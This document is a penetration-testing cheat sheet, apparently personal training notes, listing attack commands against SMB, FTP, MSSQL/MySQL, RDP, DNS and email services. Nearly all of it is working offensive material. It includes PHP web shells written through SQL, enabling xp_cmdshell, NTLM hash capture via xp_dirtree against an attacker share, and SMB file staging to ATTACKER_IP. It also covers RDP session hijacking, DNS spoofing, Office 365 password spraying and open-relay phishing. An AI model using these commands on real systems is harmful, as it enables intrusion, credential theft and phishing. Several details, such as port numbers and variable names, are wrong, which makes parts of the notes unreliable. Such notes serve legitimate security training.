# Common Services

## SMB - 445
- Server Message BLock
- share of files on the network
- rpcclient '%' $TARGET
  - enumdomusers, netshareenumall
  - enum4linux $TARGET -A -C
- Commands
  - smbclient -L //$target/ = List Shares
  - smbclient -L //$target -U admin/administrator
  - smbclient //$target/Users = Interactive shell to a share 
  - smbclient  \\\\$target\\share$ = Open a Null Session
  - smbclient //friendzone.htb/general -U "" = see files inside
  - smbclient -N -L //$target/ = List Shares as Null User
  - smbmap -u Administrator -p 'Password@1' -H $target
  - smbclient -U 'administrator%Password@1' \\\\\$target\\c$
  - Nmap scripts
    - smb-enum-users.nse
    - smb-os-discovery
    - smb-protocols
    - smb-enum-shares
    - smb-vuln*

- Scripts
  - smb-enum*
  - smb-vuln*

- Transfer files
  - On attacking maching
    - smbserver.py share .
    - smbserver.py -smb2support -username USER -password PASS share /path/to/share/local
  - On target
    - net use \\AttackingIP\share
    - net use x: \\IP\share /user:USER PASS = send to drive X:
    - copy \\IP\\share\file.ext = fetch file
    - 
    - smbclient -U USER '//IP/folder'
    - put file.name
    - smbclient -c 'put pat.exe' -U USER -W ZA '//TARGET' PASSWORD

- Use impacket
```
# create server
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password 1234567

# Connect to the SMB server
net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
net use n: \\ATTACKER_IP\share /USER:user s3cureP@ssword 
dir n: /a-d /s /b | find /c ":\\"= not directories, bare format | count
dir n:\*cred* /s /b

# Powershell
## Create object credential
$username = 'plaintext'
$password = 'Password123'
pass = convertto-securestring $password -asplain -force

# Option 1
$cred = new-object system.management.automation.pscredential('htb\john', $pass)

# Option 2
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword

New-PSDrive -Name "N" -Root "\\Attacker\share" -PSProvider "FileSystem" -Credential $cred
New-PSDrive -Name "N" -Root "\\ATTACKER_IP\share -PSProvider "FileSystem"

# retrieve the files on the share
copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe

# Disconnect server
net use \\ATTACKER_IP\share /del
```

- **enum4linux**
- [SMBGhost](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)


### SMBMAP
- Default
  - smbmap -H $target
  
- Enumerate
  - -u USERNAME
  - -r DiskName
    - smbmap -H $target -r DiskName
  - -u USER -H $target -r /ShareNAME/Folder
  - -u "" -p "" = Null section
  - -x COMMANDS
- Download

  - smbmap -u USER -H $target -r /ShareNAME/Folder ---download "share/file.ext"
- Options
  - -H: host
  - -r: path
  - -u: User
  - -p: password

## FTP - 32
- ftp $TARGET
  - mget | get
  - mput | put
- nmap --script ftp-anon

- Bounce attack: deliver outbound traffic to anotehr device
  - nmap -p 80 -b user:pass@$TARGET INTERNAL_IP

```
# CoreFTP attack
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

## mssql | mysql
- web shell to web directory
- default web server: iis apppool\defaultapppool
- mssql: tcp:1443 | upd:1434
- mysql: tco:3306 | tcfp:2433

- **sqsh**: shell database
  - sqsh -S $TARGET -U user -p pass
  - sqsh -S $TARGET -U .\\USER -P 'PASS' -h = domain
- **impacket-mssqlclient**
  - impacket-mssqlclient -p PORT user@$target
- **mysql**
  - mysql -h $TARGET -U user -pPass
  - sqlcmd -S SERVERNAME\\accountname -U julio -P 'MyPassword!' -y 30 -Y 30
    - -y (SQLCMDMAXVARTYPEWIDTH) 
    - -Y (SQLCMDMAXFIXEDTYPEWIDTH) 

- Steps
  - login with current user
  - check permissions
  - check impersonation
  - impersonate
  - check linked server
  - execute(cmd) at linkede

### Queries

#### MySQL
```
myslq: system db
information_schema: db metadata
performace_schema:  monitoring
sys:                interperte performance schema
```

- Queries
```
Select name FROM master.dbo.sysdatabases
USE db_name
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
Select table_name FROM db_name.INFORMATION_SCHEMA.TABLES
Select * from table_name;
```

- Commands
```
- xp_cmdshell
xp_cmdshell 'COMMAND'
```

- Enable xp_cmdshell
```
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

- Write Files
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
show variables like "secure_file_priv"; = read/write 
```

- Enable Ole Automation Procedures
```
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
```

- Read files
```
select LOAD_FILE("/etc/passwd");
```

#### MSSQL 
- Commands
  - sqlcmd
```
master:             info about instance
msdb:               for SQL server agent
model:              template
resource:           read-only db
tempdb:             temporary files
```

- [Queries](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

- Create file
```
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

- Read files
```
# Bulk load
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

# Exec statemente + linked server
EXECUTE("xp_cmdshell 'type C:\path\to\file'") AT [LOCAL.TEST.LINKED.SRV]
```

- Grab hash
```
# Start responder
responder | smbserver share ./ -smb2support

# xp_subdirs/xp_dirtree
EXEC master..xp_dirtree '\\$ATTACKER\share\'
EXEC master..xp_subdirs '\\$ATTACKER\share\'
hashcat 5600 (NTLMv2)
```

- Impersonate
1. Identify users

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

2. Check current role
```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
```

3. Impersonate
```
EXECUTE AS LOGIN = 'USER'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
go


# Revert
REVERT


- All users have access to master db
* USE master
```

- Linked Servers: to check their privileges
4. show remotes
  
```
# Find local linked servers . remotes
SELECT srvname, isremote FROM sysservers

# Execute commands at the linked server
EXECUTE('command') at [10.0.0.12\SQLEXPRESS]

# Example: find user inside the linked server
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]

# Read file
```

- GUI: [dbeaver](https://github.com/dbeaver/dbeaver)

## RDP
- TCP:3389
- Spraying
  - crowbar/hydra

- rdesktop -u USER -p PASS $TARGET

- Impersonate (within in the target)
  - tscon.exe $TARGET_SESSION_ID /dest:$CURRENT_SESSIONS
  - sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
  - net start sessionhijack

- Basic login
  - Disable restrcited admin mode: 
    -  reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
  - xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]
  - xfreerdp /v:IP /u:USERNAME /p:123456 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
    - hash: /pth:HASH

- Mount local folder:
  - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 
  
- Vuln:
  - [CVE-2019-0708 - BlueKeep](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)

## DNS - 53
- Tactic
  - find all records
  - zone transfer
- UDP/53, TCP/53
- Zone transfer
  - copy portion of db to another server (tcp)
  - dig axfr @dc01.name.local name.local
    - dig axfr @target.local sub.location.local
  - fierce --domain name.local
- (Sub)Domain take over
  - register non-existing to take control of aother
  - [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) 
- Enum subdomain
  - [subdomainfinder](https://github.com/projectdiscovery/subfinder)
    - subdomainfinder -d domain.local -v
    - API key
  - [subbrute](https://github.com/TheRook/subbrute)
    - subbrute domain.local -s wordlist -r resolver
      - -s list of subdomais
      - -r resolver.txt
- Spoofing/Cache poisoning
  - change legite dns record with false info => redirect traffic
- Local cache poisoning
  - ettercap
    - edit /etc/ettercap/etter.dns => map target domain

```
legit.domain      A   Attacker_IP
*.legit.domain    A   Attacker_IP
```
    - Start ettercap
      - Hosts > Scan for Hosts
      - add: Target_IP Target1 + Default_gateway Target2
      - dns_spoof: activate = Plugins > Manage Plugins
  - bettercap
  - [dnsrecon](https://securitytrails.com/blog/dnsrecon-tool)
    - dns -d domain.local -D wordlist.txt -t brt/std/zonewalk/axfr

## Email service
- MX record
- Ports: SMTP/25, IMAP4/143, POP3/110, SMTP/465, SMTP/587 (starttls), IMAP4/993, POP3/995
  - nmap -sC -sV -p25,143,110,465,587,993,995 10.129.116.123
- dig
  - dig mx domain.htb 
- host
  - host -t MX domain.htb
  - host -t A mail.domain.htb
- [MXToolbox](https://mxtoolbox.com/)
- Vuln
  - anonymous authentication
  - SMTP
    - VRFY, EXPN, RCPT T => Enumerate
      - VRFY: check email exists
      - EXPN: all users in list
      - RPCT TO: recipient of mail
        - MAIL FROM: blabla@bla.de
  - [POP3](https://www.shellhacks.com/retrieve-email-pop3-server-command-line/)
    - USER name
  
- smpt-user-enum
  - -M VRFY,EXPN, RCPT
  - -U users.txt
  - -D domain.htb
  - -t target
  
- Cloud
  - [o365spray](https://github.com/0xZDH/o365spray)
    - o365spray --validate --domain domain.htb
    - o365spray --enum -U users.txt --domain domain.htb
    - o365spray --spray -U users.txt -p 'pass' --count 1 --lockout 1 --domain domain.htb

- Open Relay
  - unauthenticated relay
  - phishing
  - nmap --script smtp-open-relay
  - swaks: SMTP test tool
    - --from test@domain.htb --to targetemail@domain.htb --header 'subject: blabla' --body 'Click here' --server $TARGET